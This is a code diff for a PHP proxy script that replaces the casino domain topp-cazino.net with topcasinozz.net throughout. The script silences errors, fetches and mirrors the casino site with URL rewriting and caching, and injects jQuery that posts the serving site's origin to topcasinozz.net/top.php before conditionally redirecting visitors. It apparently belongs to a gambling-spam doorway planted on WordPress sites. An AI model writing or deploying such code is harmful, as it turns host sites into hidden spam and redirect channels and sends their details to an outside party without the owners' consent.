@@ -17,7 +17,7 @@
 
 // require_once( $_SERVER["DOCUMENT_ROOT"] . "/wp-access-check.php" );
 
-$new_url = 'topp-cazino.net';
+$new_url = 'topcasinozz.net';
 error_reporting(0); 
 // error_reporting(E_ALL); 
 
@@ -75,9 +75,9 @@ curl_setopt( $ch, CURLOPT_USERAGENT, "Proxy" );
 curl_setopt( $ch, CURLOPT_HEADER, 0 );
 $contents = curl_exec( $ch );
 curl_close( $ch );
-$bodytag = str_replace( "((?!topp-cazino\.net/b)\w+(?:\.\w+)+", "https://topzz-casino.azurewebsites.net", $contents );
+$bodytag = str_replace( "((?!topcasinozz\.net/b)\w+(?:\.\w+)+", "https://topzz-casino.azurewebsites.net", $contents );
 $result  = preg_replace( '~' . $new_url . '~m', "topzz-casino.azurewebsites.net", $contents );
-preg_match_all( "/(https:\/\/topp-cazino.net).*\.(css|jpg|ico|svg|png|js|jpeg|webp|swf|gif|woff2|woff|ttf|pdf)/m", $contents, $urls_delim );
+preg_match_all( "/(https:\/\/topcasinozz.net).*\.(css|jpg|ico|svg|png|js|jpeg|webp|swf|gif|woff2|woff|ttf|pdf)/m", $contents, $urls_delim );
 
 function safe_file( $filename ) {
 	$dir = dirname( $filename );
@@ -144,7 +144,7 @@ $cachetime = 999999;
 			// ip:datas.ip,
 		// };
 		// jQuery.ajaxSetup({async:false, crossOrigin: true});
-		// jQuery.post( "https://topp-cazino.net/top.php", data, function(response) {
+		// jQuery.post( "https://topcasinozz.net/top.php", data, function(response) {
 			// if(response == 0){
 				// location.href = "/main.php";
 			// }
@@ -169,7 +169,7 @@ echo $result;
 			loc:window.location.origin,
 		};
 		jQuery.ajaxSetup({async:false, crossOrigin: true});
-		jQuery.post( "https://topp-cazino.net/top.php", data, function(response) {
+		jQuery.post( "https://topcasinozz.net/top.php", data, function(response) {
 			if(response == 0){
 				location.href = "/main.php";
 			}
